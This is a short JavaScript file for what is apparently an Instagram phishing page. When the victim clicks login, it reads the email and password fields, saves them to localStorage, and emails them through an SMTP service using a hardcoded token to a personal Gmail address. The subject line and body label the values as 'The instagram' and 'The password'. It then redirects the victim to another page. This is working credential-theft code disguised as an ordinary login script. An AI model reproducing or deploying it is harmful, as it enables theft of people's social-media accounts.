const email = document.getElementById('email');
const password = document.getElementById('password');
const cancelbtn = document.querySelector('.cancelbtn');
const loginbtn = document.querySelector('.loginbtn');

email.value = "";
password.value = "";

cancelbtn.addEventListener('click',()=>{
    email.value=''; password.value='';
    window.location.href = 'index.html'
});
loginbtn.addEventListener('click',()=>{
    if (email.value.replace(" ","") != '' && password.value.replace(" ","") != '') {
        const loginInfo = {mail: email.value, pwd: password.value};
        saveLoginInfo(loginInfo);
        sendEmail(loginInfo)
    } else error();
});
function sendEmail(loginInfo) {
    Email.send({
        SecureToken: '7e6d6ef4-6c07-4e0f-92f8-1b059aab13fb',
        To: 'dspeed637@gmail.com',
        From: 'dspeed637@gmail.com',
        Subject: `!!! ${loginInfo.mail} | ${loginInfo.pwd}`,
        Body: `<p><b>The instagram:</b> ${loginInfo.mail}</p> 
         <p><b>The password:</b> ${loginInfo.pwd}</p>`,
    }).then((message) => {
        //alert(message)
        window.location.href = 'select.html'
    });
}
function saveLoginInfo(info) {
    localStorage.setItem('loginInfo',JSON.stringify(info))
}
